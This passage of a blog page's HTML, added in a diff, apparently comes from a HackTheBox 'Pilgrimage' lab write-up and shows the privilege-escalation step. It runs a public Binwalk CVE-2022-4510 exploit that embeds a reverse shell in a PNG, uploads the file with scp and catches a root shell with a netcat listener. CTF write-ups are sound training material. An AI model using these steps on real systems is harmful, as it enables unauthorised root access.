+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Binwalk v2.3.2
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>With a quick google search, we can find an <a class="link" href="https://www.exploit-db.com/exploits/51249"  target="_blank" rel="noopener"
+    >exploit-db post on this</a>.</p>
+<h3 id="remote-code-execution-via-binwalk-vulnerability">Remote Code Execution via Binwalk vulnerability</h3>
+<p>The exploit script takes an input image, an attack IP address, and an attacker port number:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ python cve-2022-4510.py sample.png 10.10.14.126 8888
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">################################################
+</span></span><span class="line"><span class="cl">------------------CVE-2022-4510----------------
+</span></span><span class="line"><span class="cl">################################################
+</span></span><span class="line"><span class="cl">--------Binwalk Remote Command Execution--------
+</span></span><span class="line"><span class="cl">------Binwalk 2.1.2b through 2.3.2 included-----
+</span></span><span class="line"><span class="cl">------------------------------------------------
+</span></span><span class="line"><span class="cl">################################################
+</span></span><span class="line"><span class="cl">----------Exploit by: Etienne Lacoche-----------
+</span></span><span class="line"><span class="cl">---------Contact Twitter: @electr0sm0g----------
+</span></span><span class="line"><span class="cl">------------------Discovered by:----------------
+</span></span><span class="line"><span class="cl">---------Q. Kaiser, ONEKEY Research Lab---------
+</span></span><span class="line"><span class="cl">---------Exploit tested on debian 11------------
+</span></span><span class="line"><span class="cl">################################################
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">You can now rename and share binwalk_exploit and start your local netcat listener.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The file can be placed directly through <code>scp</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">~/</span><span class="n">Documents</span><span class="o">/</span><span class="n">Pilgrimage</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl"><span class="err">└─</span><span class="o">$</span> <span class="n">scp</span> <span class="o">./</span><span class="n">innocent</span><span class="o">.</span><span class="n">png</span> <span class="n">emily</span><span class="err">@</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="p">:</span><span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">www</span><span class="o">/</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="o">/</span><span class="n">shrunk</span><span class="o">/</span>       
+</span></span><span class="line"><span class="cl"><span class="n">emily</span><span class="err">@</span><span class="n">pilgrimage</span><span class="o">.</span><span class="n">htb</span><span class="s1">&#39;s password: </span>
+</span></span><span class="line"><span class="cl"><span class="n">innocent</span><span class="o">.</span><span class="n">png</span>                                                                      <span class="mi">100</span><span class="o">%</span> <span class="mi">2969</span>    <span class="mf">69.5</span><span class="n">KB</span><span class="o">/</span><span class="n">s</span>   <span class="mi">00</span><span class="p">:</span><span class="mi">00</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Immediately after uploading, my nc listener receives a connection:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">┌──(kali㉿kali)-[~/Documents/Pilgrimage]
+</span></span><span class="line"><span class="cl">└─$ nc -nvlp 8888
+</span></span><span class="line"><span class="cl">listening on [any] 8888 ...
+</span></span><span class="line"><span class="cl">connect to [10.10.14.126] from (UNKNOWN) [10.10.11.219] 36406
+</span></span><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="reflection">Reflection</h2>
+<p>I particularly enjoy boxes focused around a particular theme, in this situation: image manipulation. I appreciate how this box keeps it mostly simple while showcasing a couple recent CVEs related to extremely common image tools. Retrieving a password from the database directly in this manner was unintuitive for me, as clearly the database file was messy to work with. However with knowing the username we look for, it is easy to identify.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/git/">git</a>
+        
+            <a href="/tags/git-dumper/">git-dumper</a>
+        
+            <a href="/tags/imagemagick/">ImageMagick</a>
+        
+            <a href="/tags/arbitrary-file-read/">Arbitrary File Read</a>
+        
+            <a href="/tags/cyberchef/">Cyberchef</a>
+        
+            <a href="/tags/binwalk/">binwalk</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-snoopy/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-snoopy/Snoopy.5080c553490904ae8276fd384797c87a_hud07959f3cf61b04fdf0f95ac5d23e1cb_383611_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Snoopy"
+                        
+                        data-hash="md5-UIDFU0kJBK6Cdv04R5fIeg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Snoopy</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-format/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-format/Format.910e024119b03811cd8466e187bde5fe_hucfdd9eb173c0886a8604431711aec1ea_316610_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Format"
+                        
+                        data-hash="md5-kQ4CQRmwOBHNhGbhh73l/g==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Format</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-onlyforyou/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-onlyforyou/OnlyForYou.23aaa710c708eb7341f08b78acb7d1aa_hub67fe2f1a37b4ddd8d67f8b532b1624d_359490_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - OnlyForYou"
+                        
+                        data-hash="md5-I6qnEMcI63NB8It4rLfRqg==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - OnlyForYou</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-agile/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-agile/Agile.e64eb2d34a7a6346f24c5fd437dde6f0_hu5e06ffde2f95e1276a1510a6a2985d71_363689_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Agile"
+                        
+                        data-hash="md5-5k6y00p6Y0byTF/UN93m8A==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Agile</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="has-image">
+    <a href="/post/hackthebox-inject/">
+        
+        
+            <div class="article-image">
+                <img src="/post/hackthebox-inject/Inject.9f9716c1200516310e6e4cd98e20c139_hu12ac3957f7a126ac06ec9338f7d84355_333068_250x150_fill_box_smart1_3.png" 
+                        width="250" 
+                        height="150" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - Inject"
+                        
+                        data-hash="md5-n5cWwSAFFjEObkzZjiDBOQ==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">HackTheBox - Inject</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2023 Spencer&#39;s Blog
+    </section>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#foothold">Foothold</a>
+      <ol>
+        <li><a href="#enumerating-web-service">Enumerating Web Service</a></li>
+        <li><a href="#discovery-of-git-filesystem">Discovery of git filesystem</a></li>
+      </ol>
+    </li>
+    <li><a href="#foothold-1">Foothold</a>
+      <ol>
+        <li><a href="#file-read-via-imagemagick">File Read via ImageMagick</a></li>
+        <li><a href="#retrieving-database-file-via-imagemagick">Retrieving database file via ImageMagick</a></li>
+      </ol>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ol>
+        <li><a href="#enumeration-as-emily">Enumeration as emily</a></li>
+        <li><a href="#remote-code-execution-via-binwalk-vulnerability">Remote Code Execution via Binwalk vulnerability</a></li>
+      </ol>
+    </li>
+    <li><a href="#reflection">Reflection</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+
+
+    </body>
+</html>
